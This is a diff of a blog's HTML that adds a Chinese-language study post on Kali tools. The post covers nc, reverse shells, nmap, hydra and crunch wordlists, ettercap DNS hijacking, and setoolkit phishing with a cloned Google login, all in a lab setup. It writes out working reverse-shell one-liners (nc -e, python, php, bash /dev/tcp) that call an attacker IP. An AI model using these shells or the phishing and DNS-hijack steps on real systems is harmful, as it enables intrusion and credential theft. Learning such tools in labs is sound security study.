@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"CSRF","path":"2025/08/24/CSRF/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"渗透测试值工具kali","path":"2025/10/26/渗透测试值工具kali/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"LazySysAdmin靶场渗透","path":"2025/10/13/LazySysAdmin靶场渗透/"},{"title":"pop","path":"2025/07/07/pop/"}]`)
+  const posts = JSON.parse(`[{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"CSRF","path":"2025/08/24/CSRF/"},{"title":"LazySysAdmin靶场渗透","path":"2025/10/13/LazySysAdmin靶场渗透/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"渗透测试值工具kali","path":"2025/10/26/渗透测试值工具kali/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -258,13 +258,13 @@
       <div class="main-left--statics">
         <a href="/categories">
           <div>
-            <span>8</span>
+            <span>9</span>
             <span>分类</span>
           </div>
         </a>
         <a href="/tags">
           <div>
-            <span>9</span>
+            <span>10</span>
             <span>标签</span>
           </div>
         </a>
@@ -358,13 +358,13 @@
           
           <div class="article-info--categories">
             <span>分类：</span>
-            
+            <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/">渗透测试1</a>
           </div>
           
           
           <div class="article-info--tags">
             <span>标签：</span>
-            
+            <a class="tag-link" href="/tags/%E5%B7%A5%E5%85%B7kali/" rel="tag">工具kali</a>
           </div>
           
           <p class="article-info--date">日期：2025-10-26 22:28:29</p>
@@ -373,7 +373,124 @@
       </div>
     </div>
     <article class="article-content markdown-body">
-      
+      <h2 id="kali使用"><a href="#kali使用" class="headerlink" title="kali使用"></a>kali使用</h2><h3 id="nc工具"><a href="#nc工具" class="headerlink" title="nc工具"></a>nc工具</h3><p>众所周知nc是kali里面一个很重要的工具</p>
+<p><strong>主要功能</strong>是可以再两台设备上面相互交互，即侦听模式</p>
+<h4 id="1-简单交互"><a href="#1-简单交互" class="headerlink" title="1.简单交互"></a>1.简单交互</h4><p>简单的可以用来一台靶机去监听另一台靶机来达到简单的交互功能</p>
+<p>比如说现在是kali开启一个监听端口7777，并且输出连接详情信息 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
+
+<p>那么这个端口就是在等待别的靶机给他来传输一些信息</p>
+<p>让一台centos靶机来连接这个端口来达到两台靶机交互的目的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip(监听机的ip) 7777（端口号）</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-传输文件里面的内容"><a href="#2-传输文件里面的内容" class="headerlink" title="2.传输文件里面的内容"></a>2.传输文件里面的内容</h4><p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/07b60c25786aed116a31f3f3e3dc7c6b.png" alt="img"></p>
+<h4 id="3-获取shell"><a href="#3-获取shell" class="headerlink" title="3.获取shell"></a>3.获取shell</h4><p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/8b93df6fb3c5820ee1e6e94d82ec6ca6.png" alt="img"></p>
+<p>实操：</p>
+<p>前提：centos7是目标服务器    kali攻击服务器</p>
+<h5 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h5><p><strong>服务器发起监听，并发出shell文件，攻击机来连接，攻击机正向获取权限</strong></p>
+<p>服务器端</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/2695d2f9c42fe2ad21fa4edb42cdca80.png" alt="img"></p>
+<p>攻击机</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/3d9e68f9a2befc242272f450c88d55ac.png" alt="img"></p>
+<p>这里注意服务器端的防火墙要对6666端口放心，否则服务器会将6666的tcp入站包丢弃了</p>
+<p>&#x2F;bin&#x2F;bash</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/689860785da08dcce98cefb4d1770d17.png" alt="img"></p>
+<p>bash &#x3D; shell，运行在终端之上，负责：<br>显示提示符<br>解析命令<br>执行系统调用<br>做管道、重定向、变量展开等</p>
+<h5 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h5><p><strong>攻击机发起监听 目标服务器发出shell文件，主动来连接攻击机的监听端口</strong></p>
+<p>攻击机</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/2605cb49a197c40956593f0ecf4c710b.png" alt="img"></p>
+<p>服务器</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251024213606770-17613129681361.png" alt="image-20251024213606770"></p>
+<h5 id="正向shell和反向shell"><a href="#正向shell和反向shell" class="headerlink" title="正向shell和反向shell"></a>正向shell和反向shell</h5><p>正向shell（内网）</p>
+<p>上面也提到过正向shell连接，必须得是目标服务器的那个监听端口在防火墙上被放开了，否则就会连不上</p>
+<p>所以一般正向用的很少，一般放在不出内网的情况下，也就是靶机不能正常上网，但是可以访问内网主机</p>
+<p>反向shell（外网）</p>
+<p>就是等目标服务器来主动连接我们，因为我们可以决定我们的机器（攻击机）上的哪些端口可以被开放</p>
+<p>所以一般用的比较多的就是<strong>反弹shell，让目标服务器主动来连接上我们的攻击机，然后得到目标服务器的shell</strong></p>
+<p>但是nc这款工具在执行反弹shell最有局限的地方就是，万一目标服务器没有nc呢这咋办</p>
+<p>下面介绍一些除了nc来反弹shell的其他方法</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>下面是让目标服务器主动连到我们监听端口的命令（具体怎么主动后面还会讲）</p>
+<p>利用工具nc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.240.99 6666 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.240.99&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &quot;\$s=fsockopen(&#x27;192.168.240.99&#x27;,6666);proc_open(&#x27;/bin/sh&#x27;,array(0=&gt;\$s,1=&gt;\$s,2=&gt;\$s),\$pipes);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>linux自带的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.240.99/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><p>namp ip  扫描主机开放的端口（这个ip可以连接的到）</p>
+<p>namp -sV也可以用来端口扫描</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251025164903964-17613821456901.png" alt="image-20251025164903964"></p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251025165849451-17613827307882.png" alt="image-20251025165849451"></p>
+<h3 id="xhydra-九头蛇-（爆破）"><a href="#xhydra-九头蛇-（爆破）" class="headerlink" title="xhydra(九头蛇)（爆破）"></a>xhydra(九头蛇)（爆破）</h3><p>xhydra是图形化的爆破</p>
+<p>hydra是命令行形式的。之前在做实验时，ssh密码爆破就是用的这个命令</p>
+<p>但是我们爆破就需要有字典，字典怎么来呢</p>
+<h3 id="crunch（创建密码字典工具）"><a href="#crunch（创建密码字典工具）" class="headerlink" title="crunch（创建密码字典工具）"></a>crunch（创建密码字典工具）</h3><p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251025172716444-17613844374763.png" alt="image-20251025172716444"></p>
+<p>这一步我们就会用到kali的另一个工具cewl</p>
+<h4 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h4><p>cewl 用于从目标网站 爬取页面内容，并提取出其中的 关键词、用户名、邮箱、密码提示 等信息，生成 自定义字典（wordlist），用于后续的 密码爆破 或 社会工程学攻击。</p>
+<p>但是一般网站都会做防爬策略，一般爬不到什么重要信息，那就要另想方法去打入内部获取信息，然后根绝得到的信息组成各种不同形式的密码组成一个密码字典（可以利用crunch）</p>
+<p>crunch自己生成一个密码字典</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 6 8 123 &gt; num6-8.txt//生成6-8位密码 是将123这三个数字拆分然后组合</span><br></pre></td></tr></table></figure>
+
+<p>下面假如我收集到了一些重要的信息，需要把这些信息组合起来</p>
+<p>vi read.txt把我们收集到的信息放进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 1 -q read</span><br></pre></td></tr></table></figure>
+
+<p>当</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251025174126430-17613852876544.png" alt="image-20251025174126430"></p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251025174226928-17613853481335.png" alt="image-20251025174226928"></p>
+<p>代表四位数字密码 第一个数字，第二个特殊字符，第三个小写，第四个大写</p>
+<h3 id="ettercap（dns劫持）"><a href="#ettercap（dns劫持）" class="headerlink" title="ettercap（dns劫持）"></a>ettercap（dns劫持）</h3><p>这个工具一般就是做dns劫持，arp欺骗的</p>
+<p><strong>dns劫持：</strong></p>
+<p>先说正常情况下，我在浏览器输入一个域名，然后电脑就回去访问“地址簿”–DNS服务器，通过这个去找这个域名对应哪个ip，然后DNS把正确的门牌号告诉我，浏览器就能顺利访问到真正的网站</p>
+<p>但是如果被劫持了</p>
+<p>就是有人偷偷把地址簿撕掉一页，然后重新写了一个假的门牌号，然后当我去问DNS是，就只能拿到一个假的IP，那浏览器就只能找到一个假冒的网站了</p>
+<p><strong>下面开始利用kali和win10来演示整个过程</strong></p>
+<p>首先要让浏览器访问到一个假的网站界面，那我们就真的得有一个网站界面吧</p>
+<p>搭建网站的一个必要条件就是中间件，kali自带一个中间件是apache2，我们中间件打开，然后进入一个网站的配置目录</p>
+<p>&#x2F;var&#x2F;www&#x2F;html目录</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026170107252-17614692698621.png" alt="image-20251026170107252"></p>
+<p>然后我们做到这别人就能通过我们的ip访问到我kali网站的主页面</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026170523265-17614695259452.png" alt="image-20251026170523265"></p>
+<p>到这我们在kali上的准备就做完了，下面开始做准备拦截的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2025-10-26 171441](屏幕截图 2025-10-26 171441-17614701280453.png)</p>
+<p>这代表我们将被害主机发出的全部访问，全部返回192.168.240.99的网站主页面</p>
+<p>下面开始dns拦截</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026171927533-17614703687674.png" alt="image-20251026171927533"></p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026172307037-17614705882945.png" alt="image-20251026172307037"></p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026172535235-17614707362376.png" alt="image-20251026172535235"></p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026172735536-17614708566047.png" alt="image-20251026172735536"></p>
+<p>开始拦截，去验证一下</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026172827222-17614709085368.png" alt="image-20251026172827222"></p>
+<p>成功拦截</p>
+<h3 id="evillimiter-断网攻击"><a href="#evillimiter-断网攻击" class="headerlink" title="evillimiter(断网攻击)"></a>evillimiter(断网攻击)</h3><p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026202434764-17614814762931.png" alt="image-20251026202434764"></p>
+<h3 id="setoolkit（社会工程学）（钓鱼攻击）"><a href="#setoolkit（社会工程学）（钓鱼攻击）" class="headerlink" title="setoolkit（社会工程学）（钓鱼攻击）"></a>setoolkit（社会工程学）（钓鱼攻击）</h3><p>社会工程学集成攻击工具</p>
+<p>下载好之后输入setoolkit会出现几个选项</p>
+<p>第一个就是社会工程学攻击</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026213955500-17614859965622.png" alt="image-20251026213955500"></p>
+<p>我们输入1就会出现新的选项，然后输入2我们来具体学习一下钓鱼攻击</p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026215103713-17614866650843.png" alt="image-20251026215103713"></p>
+<p><img src="/2025/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%80%BC%E5%B7%A5%E5%85%B7kali/image-20251026215450836-17614868936294.png" alt="image-20251026215450836"></p>
+<p>当我们进入到3之后钓鱼网站攻击之后，又会出现3个选项，就是图中的三个</p>
+<p>假如我们现在又选择了1，就又会出现几个选项我们随便选一个进行测试，我选了谷歌的登录界面</p>
+<p>这是如果又其他主机此时访问我们kali的ip就会出现谷歌的登录界面，然后如果他在里面输入了他谷歌的登录的账号和密码就会被记录下来</p>
+<p>钓鱼网站：</p>
+<ul>
+<li>复制外观 &#x3D; 克隆前端页面（保存 HTML&#x2F;CSS&#x2F;图片，10 秒搞定）。</li>
+<li>换门牌号 &#x3D; 注册近似域名、短信&#x2F;邮件里发假链接，或 DNS 劫持把真域名解析到攻击者服务器。</li>
+<li>留签字 &#x3D; 后台脚本把用户输入的账号、密码、2FA 实时写进攻击者的数据库&#x2F;电报频道。</li>
+<li>转身领真包裹 &#x3D; 攻击者拿到凭证后立即登录真网站，转走资金、下载数据、发诈骗链。</li>
+</ul>
+<p>一般钓鱼网站和dns劫持一起使用，先克隆一个一摸一样的前端页面，然后用dns，把受害者拐到自己克隆的假网站</p>
+<p>我这里只是简单的介绍了一下一个功能，如果要具体使用的话，可以参考下面这篇文章写的很全面</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/freeking101/article/details/125697031">渗透测试 ( 9 ) — 社会工程攻击工具 setoolkit_setoolkit二维码攻击-CSDN博客</a></p>
+
     </article>
     
     <div class="read-nums">
@@ -394,7 +511,7 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#kali%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">kali使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.</span> <span class="toc-text">nc工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E4%BA%A4%E4%BA%92"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.简单交互</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.传输文件里面的内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.获取shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%90%91shell"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">正向shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%90%91shell"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">反向shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">正向shell和反向shell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.1.4.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#namp"><span class="toc-number">1.2.</span> <span class="toc-text">namp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xhydra-%E4%B9%9D%E5%A4%B4%E8%9B%87-%EF%BC%88%E7%88%86%E7%A0%B4%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">xhydra(九头蛇)（爆破）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crunch%EF%BC%88%E5%88%9B%E5%BB%BA%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">crunch（创建密码字典工具）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cewl"><span class="toc-number">1.4.1.</span> <span class="toc-text">cewl</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ettercap%EF%BC%88dns%E5%8A%AB%E6%8C%81%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">ettercap（dns劫持）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#evillimiter-%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.</span> <span class="toc-text">evillimiter(断网攻击)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setoolkit%EF%BC%88%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%EF%BC%89%EF%BC%88%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">setoolkit（社会工程学）（钓鱼攻击）</span></a></li></ol></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
